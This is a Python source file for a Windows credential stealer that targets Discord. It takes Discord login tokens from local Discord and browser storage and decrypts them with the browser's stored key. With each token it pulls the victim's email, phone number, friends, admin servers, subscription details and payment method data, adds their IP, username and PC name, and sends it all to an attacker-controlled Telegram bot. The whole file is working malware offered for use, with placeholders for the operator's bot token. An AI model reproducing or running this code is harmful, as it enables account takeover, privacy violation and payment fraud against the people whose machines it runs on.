import os
if os.name != "nt":
    exit()
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime
import requests
def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])

import win32crypt
from Crypto.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if token:
        headers.update({"Authorization": token})

    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens
    
def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()

    return key

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"
def get_image(id,photo_id) ->str:
    size = 256 / 2
    return f"https://cdn.discordapp.com/avatars/{id}/{photo_id}.png?size={size}"
def main(telegram_token):
    
    checked = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)
                headers = getheaders(token)
                res = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
                res_json = res.json()
                if res.status_code != 200:
                    continue
                badges = ""
                flags = res_json['flags']
                if flags == 64 or flags == 96:
                    badges += ":BadgeBravery: "
                if flags == 128 or flags == 160:
                    badges += ":BadgeBrilliance: "
                if flags == 256 or flags == 288:
                    badges += ":BadgeBalance: "

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/relationships', headers=headers)).read().decode())
                friends = len([x for x in res if x['type'] == 1])

                params = urllib.parse.urlencode({"with_counts": True})
                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=headers)).read().decode())
                guilds = len(res)
                guild_infos = ""

                for guild in res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:
                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=headers)).read().decode())
                        vanity = ""

                        if res["vanity_url_code"] != None:
                            vanity = f"""; .gg/{res["vanity_url_code"]}"""

                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
                if guild_infos == "":
                    guild_infos = "No guilds"

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)).read().decode())
                has_nitro = False
                has_nitro = bool(len(res) > 0)
                exp_date = None
                if has_nitro:
                    badges += f":BadgeSubscriber: "
                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=headers)).read().decode())
                available = 0
                print_boost = ""
                boost = False
                for id in res:
                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        print_boost += f"ㅤ- Available now\n"
                        available += 1
                    else:
                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                    boost = True
                if boost:
                    badges += f":BadgeBoost: "

                payment_methods = 0
                type = ""
                valid = 0
                payment_sources = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources",headers=headers).json()
                for x in payment_sources:
                    if x['type'] == 1:
                        payment_type = f"<b>{x['brand'] }</b>"
                        name = f"{x['billing_address']['name']}"
                        text = f"""                            
                        {payment_type}\nName: {name}\ncountry: {x['country'] }\nlast 4 digits: {x['last_4']}                      
                        """
                        type += text
                        payment_methods += 1
                    if x['type'] == 2:
                        name = f"{x['billing_address']['name']}"
                        payment_type = f"<b>Paypal</b>"
                        text = f"""               
                        {payment_type}\nEmail: {x['email']}\nName: {name}\ncountry: {x['country']}\n
                        """
                        type += text
                        payment_methods += 1
                print_nitro = f"\nNitro Informations:\nyaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n"
                nnbutb = f"\nNitro Informations:\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                print_pm = f"\nPayment Methods:\nAmount: {payment_methods}\nValid Methods: {valid} method(s){type}"
                data = {
                    "chat_id":"",  # Enter Your chat id here...
                    "parse_mode":"HTML",
                    "caption":f"""
                    User ID: {res_json['id']}Email: {res_json['email']}Phone Number: {res_json['phone']}
                    Friends: {friends}\nGuilds: {guilds}
                    <b>Admin Permissions:</b> {guild_infos} \nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\nToken: \n<tg-spoiler>{token}</tg-spoiler>
                    """,
                    'photo': get_image(res_json['id'],res_json['avatar']),
                }
                telegram_api = f'https://api.telegram.org/bot{telegram_token}'
                res = requests.post(telegram_api+'/sendPhoto',data=data)        
                if res.status_code != 200:
                    print(res.json())
                    
            except requests.HTTPError:
                return
         
if __name__ == "__main__":
    main("") #Enter your telegram bot token here...